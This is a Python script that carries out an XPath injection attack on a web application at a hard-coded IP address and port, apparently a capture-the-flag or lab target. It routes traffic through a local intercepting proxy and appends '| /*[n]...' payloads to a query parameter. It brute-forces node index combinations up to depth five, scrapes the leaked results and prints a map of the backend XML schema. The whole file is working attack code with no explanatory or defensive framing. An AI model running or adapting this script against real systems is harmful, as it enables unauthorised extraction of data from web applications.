import requests
import time
import urllib3
from prettytable import PrettyTable
from itertools import product

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_results_section(html_content):
    pattern = r'<center>\s*<b>\s*Results:\s*</b>\s*<br>\s*<br>\s*([^<]*)</center>'
    import re
    match = re.search(pattern, html_content, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def test_payload(base_url, payload):
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Sec-GPC': '1'
    }

    url = f"{base_url}?q=false&f=fullstreetname%20|%20{payload}"
    
    try:
        response = requests.get(
            url, 
            headers=headers, 
            proxies=proxies, 
            verify=False
        )
        
        print(f"\nTesting payload: {payload}")
        print(f"URL: {url}")
        
        result = extract_results_section(response.text)
        if result and result != "No Results!":
            print(f"Results found: {result}")
            return result
        else:
            print("No valid results found")
            return None
            
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return None

def explore_combinations(base_url, max_depth=5, max_index=9):
    results = {}
    
    # Try different depths
    for depth in range(1, max_depth + 1):
        print(f"\nExploring depth {depth}")
        print("=" * 50)
        
        # Generate all possible combinations for current depth
        # Using range(1, max_index + 1) to start from 1 to max_index
        combinations = product(range(1, max_index + 1), repeat=depth)
        
        for combo in combinations:
            # Convert combination to XPath
            payload = "".join([f"/*[{x}]" for x in combo])
            
            result = test_payload(base_url, payload)
            time.sleep(0.5)
            
            if result:
                results[payload] = result
                print(f"Valid combination found: {payload} => {result}")
    
    return results

def main():
    base_url = "http://94.237.54.42:30639/index.php"
    
    print("Starting comprehensive schema mapping...")
    print("Proxy: http://127.0.0.1:8080")
    print("-" * 50)
    
    # Start exploration
    all_results = explore_combinations(base_url, max_depth=5, max_index=9)
    
    # Display results in table format
    print("\n\nComplete Schema Map:")
    print("=" * 80)
    
    table = PrettyTable()
    table.field_names = ["Depth", "Payload", "Result"]
    table.align = "l"  # Left align
    
    # Sort results by depth and payload
    sorted_results = sorted(all_results.items(), key=lambda x: (x[0].count("/*"), x[0]))
    
    for payload, result in sorted_results:
        depth = payload.count("/*")
        table.add_row([depth, payload, result])
    
    print(table)
    
    # Additional analysis
    print("\nSchema Analysis Summary:")
    print("=" * 80)
    
    # Group results by depth
    depth_groups = {}
    for payload, result in all_results.items():
        depth = payload.count("/*")
        if depth not in depth_groups:
            depth_groups[depth] = []
        depth_groups[depth].append((payload, result))
    
    # Print summary for each depth
    for depth in sorted(depth_groups.keys()):
        results = depth_groups[depth]
        print(f"\nDepth {depth}:")
        print(f"Number of valid combinations: {len(results)}")
        print("Sample payloads:")
        for payload, result in sorted(results)[:5]:  # Show first 5 examples
            print(f"  {payload} => {result}")
        
        # Analyze patterns at this depth
        print("Common patterns:")
        patterns = {}
        for payload, _ in results:
            parts = payload.split("/*")[1:]  # Split into individual indexes
            parts = [p.strip("[]") for p in parts]
            for i, part in enumerate(parts):
                if i not in patterns:
                    patterns[i] = set()
                patterns[i].add(part)
        
        for pos, values in patterns.items():
            print(f"  Position {pos + 1}: Valid indexes = {sorted(list(values))}")

if __name__ == "__main__":
    main()